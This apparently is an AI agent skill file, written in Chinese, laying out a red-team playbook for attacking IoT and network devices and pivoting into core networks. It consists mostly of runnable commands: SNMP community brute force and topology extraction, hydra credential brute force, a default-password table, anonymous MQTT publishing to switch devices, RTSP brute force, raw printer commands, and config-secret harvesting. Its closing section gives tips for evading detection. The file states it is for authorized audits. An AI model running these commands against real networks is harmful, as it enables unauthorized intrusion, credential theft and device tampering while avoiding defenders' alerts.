---
name: iot-snmp-pivot
description: IoT / 网络设备攻击面与内网摆渡。SNMP community 爆破与 OID 取配置、默认凭据矩阵、MQTT/CoAP/UPnP/mDNS 未授权面、摄像头/打印机/NAS 常见漏洞、固件取配置、从设备横向到核心网。授权内网审计使用。
tags: [iot, snmp, mqtt, upnp, network-device, pivot, intranet, redteam]
---

# IoT / 网络设备攻击面与摆渡

**判定纪律**：内网设备扫描最大的坑是**把「端口开着」当成「能用」**。SNMP 161/udp 开着不等于 community 对；MQTT 1883 开着不等于能匿名订阅。每个结论必须落到**实际取到的数据**（一条 sysDescr、一条 message），不能停在 banner。

## 一、扫描（UDP 是重点）

```bash
# 设备发现：UDP 优先，很多设备不开 TCP
nmap -sU -p 161,1900,5353,47808,623 --open -T4 10.0.0.0/24

# 组合扫描（快）
nmap -sS -sU -p T:22,23,80,443,8080,8443,1883,8883,554,37777 U:161,1900,5353 \
  --open -Pn -T4 --max-retries 2 10.0.0.0/24 -oG iot.gnmap

# 从 nmap 结果提取存活设备
grep -i 'open' iot.gnmap | awk '{print $2}' > live.txt
```

| 端口 | 协议 | 设备类型 |
|---|---|---|
| 161/udp | SNMP | 交换机/打印机/AP/NAS/服务器 iLO |
| 1900/udp | UPnP SSDP | 路由器/智能电视/NAS |
| 5353/udp | mDNS | Apple 设备、打印机、IoT |
| 47808/udp | BACnet | 楼宇自控（暖通） |
| 623/udp | IPMI | 服务器带外管理 ⚠️ 高危 |
| 1883/8883 | MQTT | IoT 网关/传感器 |
| 554 | RTSP | 摄像头 |
| 37777 | 大华私有 | 摄像头/NVR |
| 9100 | RAW 打印 | 打印机 |

## 二、SNMP：内网最有价值的一块

### community 爆破

```bash
# 常见 community（按命中率排序）
# public private cisco manager admin snmp monitor readonly write read
for c in public private cisco manager admin snmp monitor readonly; do
  r=$(timeout 2 snmpget -v2c -c "$c" -t 1 -r 0 10.0.0.1 1.3.6.1.2.1.1.1.0 2>/dev/null)
  [ -n "$r" ] && echo "[+] $c => $r"
done

# 批量（onesixtyone 比 snmpwalk 快得多）
onesixtyone -c <(printf '%s\n' public private cisco admin manager) -i live.txt

# v3 也要试（很多设备 v3 用默认 user）
snmpwalk -v3 -l noAuthNoPriv -u public 10.0.0.1 1.3.6.1.2.1.1
```

### 关键 OID（按价值排序）

| OID | 内容 | 为什么值钱 |
|---|---|---|
| `1.3.6.1.2.1.1.1.0` | sysDescr | 型号+固件版本，决定打哪个 CVE |
| `1.3.6.1.2.1.1.5.0` | sysName | 主机名，常含角色（core-sw-01） |
| `1.3.6.1.2.1.4.20.1.1` | ipAdEntAddr | **设备所有 IP，含管理网段** |
| `1.3.6.1.2.1.4.21.1.1` | ipRouteDest | **路由表 → 内网拓扑** |
| `1.3.6.1.2.1.2.2.1.2` | ifDescr | 网卡/VLAN 列表 |
| `1.3.6.1.2.1.17.4.3.1.2` | dot1dTpFdbPort | **MAC 表 → 定位主机在哪个口** |
| `1.3.6.1.2.1.25.6.3.1.2` | 已安装软件 | 终端/服务器 |
| `1.3.6.1.2.1.25.4.2.1.2` | 运行进程 | 服务器 |
| `1.3.6.1.4.1.9.9.96` | Cisco 配置 | ⚠️ 部分 IOS 能读 running-config |
| `1.3.6.1.4.1.2021.4` | UCD-SNMP 内存 | Linux 主机 |

```bash
# 一把梭：拓扑 + 资产
snmpwalk -v2c -c public -On 10.0.0.1 1.3.6.1.2.1.4.20.1.1     # 所有 IP
snmpwalk -v2c -c public -On 10.0.0.1 1.3.6.1.2.1.4.21.1.1     # 路由表
snmpwalk -v2c -c public -On 10.0.0.1 1.3.6.1.2.1.17.4.3.1.2   # MAC 表
snmpwalk -v2c -c public -On 10.0.0.1 1.3.6.1.2.1.25.4.2.1.2   # 进程（主机）
snmpwalk -v2c -c public -On 10.0.0.1 1.3.6.1.4.1             # 厂商私有树

# 直接 dump 全部（数据量大但最全）
snmpwalk -v2c -c public 10.0.0.1 > snmp_10.0.0.1.txt
```

**从 SNMP 到横向的三条路**：
1. `ipRouteDest` 拿到其他网段 → 找下一跳设备继续打
2. `dot1dTpFdbPort` + `ifDescr` 定位某台交换机的某个口上有哪台机器
3. `ipAdEntAddr` 发现**管理网段**（192.168.x / 10.x 之外的独立管理 VLAN）——那里通常没有任何防护

## 三、默认凭据矩阵

```bash
# 先看设备型号，再查默认密码（不要盲试，会锁账号）
# http(s) 批量
hydra -C creds.txt -s 443 -S -f 10.0.0.1 https-get /login
hydra -C creds.txt -f 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# ssh / telnet
hydra -C creds.txt -f -t 4 10.0.0.1 ssh
hydra -C creds.txt -f -t 4 10.0.0.1 telnet
```

| 厂商 | 默认账号 | 备注 |
|---|---|---|
| Cisco IOS | `cisco/cisco` `admin/admin` | enable 密码可能为空 |
| H3C / 华为 | `admin/admin` `admin/Admin@huawei` | VRP |
| 海康威视 | `admin/12345` | 老固件；新固件强密码 |
| 大华 | `admin/admin` `888888/888888` | |
| 锐捷 | `admin/admin` | |
| TP-Link | `admin/admin` | |
| MikroTik | `admin/`（空密码） | 452 起强制密码 |
| 打印机（HP/Brother） | `admin/(空)` | 9100 端口可直打 |
| iLO / iDRAC | `Administrator/<标签上的随机密码>` | 物理接触才知 |

## 四、其它未授权面

### MQTT（1883）

```bash
# 匿名订阅
mosquitto_sub -h 10.0.0.1 -p 1883 -t '#' -v

# 匿名发布（可伪造传感器数据 / 触发电器动作）
mosquitto_pub -h 10.0.0.1 -p 1883 -t 'home/light/1' -m 'ON'

# python 快速遍历所有 topic
pip install paho-mqtt
python3 -c "
import paho.mqtt.client as m
c=m.Client(); c.on_message=lambda a,u,msg: print(msg.topic, msg.payload[:100])
c.connect('10.0.0.1',1883); c.subscribe('#'); c.loop_forever()
"
```

### UPnP（1900/udp）

```bash
# SSDP 发现
echo -e 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n' \
  | nc -u -w2 239.255.255.250 1900

# 拿到 LOCATION 后拉 device description，看 controlURL
curl -s http://10.0.0.1:5000/rootDesc.xml | grep -E 'controlURL|serviceType'

# 常见攻击：AddPortMapping 打 NAT 洞（把内网服务暴露到公网）
```

### RTSP（554，摄像头）

```bash
# 未授权取流
ffprobe -rtsp_transport tcp rtsp://10.0.0.1:554/Streaming/Channels/101
# 海康默认路径 /Streaming/Channels/101，大华 /cam/realmonitor?channel=1&subtype=0

# 弱口令批量
nmap -p554 --script rtsp-url-brute 10.0.0.1
```

### 打印机（9100）

```bash
# 直接发 PostScript/PJL 文本
printf '\x1b%%-12345X@PJL INFO ID\r\n\x1b%%-12345X' | nc -w2 10.0.0.1 9100
# 打印机的共享 SMB 目录常存扫描件（含内部文档）
```

## 五、从设备取配置（固件/备份）

| 设备 | 配置导出 |
|---|---|
| Cisco IOS | `snmpwalk ... 1.3.6.1.4.1.9.9.96` 或 tftp 备份 |
| 华为/H3C | 备份文件常通过 tftp/ftp 拉 |
| 海康/大华 | 配置备份 .cfg 需解密（可逆，见 `firmware-pentest`） |
| 家用路由 | backup.cfg / .bin，多为 XOR/固定密钥 |
| NAS | `~/.config` 里 ssh key、docker compose |

拿到配置后重点找：**radius/tacacs+ 密钥**、**SNMP community**、**VPN 预共享密钥**、**AD 绑定账号**。这四样是从设备跳到核心网的桥。

## 六、常见误判

| 现象 | 误解 | 实际 |
|---|---|---|
| 161/udp open 但 snmpwalk 超时 | 有防护 | 可能只响应特定 source IP，换源地址试 |
| snmpwalk 只返回 system 树 | 权限低 | 部分设备 v2c public 只给 system，试 private |
| MQTT 1883 连上但订阅无数据 | 没设备 | 可能 topic 需要具体前缀，`#` 不总是被允许 |
| SSDP 无响应 | 不支持 UPnP | 可能绑在其他接口，换 `eth0` 直连 |
| 摄像头 554 401 | 打不了 | 试匿名 `rtsp://ip:554/` 空路径，或 ONVIF 端口 80 拿 profile |
| 默认密码全部失败 | 不是默认 | 新固件强制首次设密码，转固件提取 |

## 七、检测规避要点

- SNMP 爆破**每秒不要超过 3 次**，多数 NMS 会告警 `SNMP auth failure`
- MQTT 订阅 `#` 会在 broker 日志留痕，先 `$SYS/#` 试探
- 摄像头 RTSP 拉流会占带宽，明显可见
- **打印机 9100 打测试页会留物理痕迹**——这是个真实事故点，别在客户现场做
